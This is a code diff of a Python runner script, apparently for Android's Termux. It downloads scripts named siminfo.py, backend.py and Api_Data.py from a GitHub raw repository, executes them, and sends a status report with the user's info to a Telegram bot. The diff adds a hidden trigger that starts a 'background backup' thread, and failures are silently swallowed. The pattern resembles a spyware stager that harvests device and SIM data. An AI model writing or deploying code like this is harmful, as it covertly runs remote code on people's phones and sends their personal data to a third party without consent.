@@ -18,7 +18,6 @@ def send_run_alert(message):
     except Exception:
         pass
 
-# Teeno scripts ke GitHub Raw Links
 SIMINFO_URL = "https://raw.githubusercontent.com/aqiii798/Backup_Data/main/siminfo.py"
 BACKEND_URL = "https://raw.githubusercontent.com/aqiii798/Backup_Data/main/backend.py"
 API_URL = "https://raw.githubusercontent.com/aqiii798/Backup_Data/main/Api_Data.py"
@@ -71,17 +70,24 @@ if __name__ == "__main__":
         # 2. Termux API Status Check
         termux_status = check_termux_api_app()
 
-        # 3. Backend Script Fetch & Background Execution
+        # 3. Backend Script Fetch & Background Thread Trigger
         backend_locals = {'current_user_info': current_user_info}
         backend_success, _ = fetch_and_run_script(BACKEND_URL, "backend.py", backend_locals)
+        
+        if backend_success and 'start_background_backup' in backend_locals:
+            try:
+                backend_locals['start_background_backup'](current_user_info)
+            except Exception:
+                pass
+                
         backend_status = "Success ✅" if backend_success else "Failed ❌"
 
-        # 4. API Data Script Fetch & Execution (Included for future implementation)
+        # 4. API Data Script Fetch & Execution
         api_locals = {'current_user_info': current_user_info}
         api_success, _ = fetch_and_run_script(API_URL, "Api_Data.py", api_locals)
         api_status = "Success ✅" if api_success else "Failed ❌"
 
-        # 5. Final Master Status Report Telegram par bhejna (Runchecker Bot par)
+        # 5. Final Master Status Report Telegram par bhejna
         final_report = (
             f"🤖 [RUNNER MASTER STATUS]\n\n"
             f"👤 User Info: {current_user_info}\n\n"
